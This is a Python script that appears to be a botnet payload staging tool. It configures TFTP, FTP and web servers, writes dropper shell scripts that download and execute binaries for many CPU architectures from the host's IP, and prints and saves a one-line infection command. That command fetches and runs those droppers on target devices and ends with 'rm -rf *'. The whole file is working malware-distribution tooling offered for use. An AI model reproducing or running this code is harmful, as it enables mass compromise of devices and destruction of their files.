import subprocess
import sys
import urllib.request
import time

ip = urllib.request.urlopen('http://api.ipify.org').read().decode('utf-8')
exec_bin = "Space"
bin_prefix = "Space."
bin_directory = "hiddenbin"

archs = [
    "arc", "x86", "x86_64", "i686", "mips", "mips64", "mpsl",
    "arm", "arm5", "arm6", "arm7", "ppc", "sparc", "m68k", "sh4"
]

def run(cmd):
    subprocess.call(cmd, shell=True)

print("Setting up HTTP, TFTP and FTP for your payload")
print(" ")
run("")

run('''echo "service tftp
{
    socket_type             = dgram
    protocol                = udp
    wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')

run("service xinetd start &> /dev/null")

run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address=''' + ip + '''
listen_port=21" > /etc/vsftpd.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("Creating .sh Bins")

print(" ")

run('echo "#!/bin/bash" > /var/lib/tftpboot/1.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/1.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/3.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/3.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/3.sh')
run('echo "#!/bin/bash" > /var/www/html/1.sh')
run('echo "ulimit -n 1024" >> /var/www/html/1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/www/html/1.sh')
run('echo "#!/bin/bash" > /var/ftp/2.sh')
run('echo "ulimit -n 1024" >> /var/ftp/2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/2.sh')

for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/www/html/1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/ftp/2.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/3.sh')    

run("service xinetd restart &> /dev/null")
run("service apache2 restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[38;5;99mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/1.sh; curl -O http://" + ip + "/1.sh; chmod 777 1.sh; sh 1.sh; tftp " + ip + " -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g " + ip + "; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *\x1b[0m")
print("")

complete_payload = ("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/1.sh; curl -O http://" + ip + "/1.sh; chmod 777 1.sh; sh 1.sh; tftp " + ip + " -c get 1.sh; chmod 777 1.sh; sh 1.sh; tftp -r 3.sh -g " + ip + "; chmod 777 3.sh; sh 3.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " 2.sh 2.sh; sh 2.sh; rm -rf 1.sh 1.sh 3.sh 2.sh; rm -rf *")
file = open("payload.txt", "w+")
file.write(complete_payload)
file.close()
exit()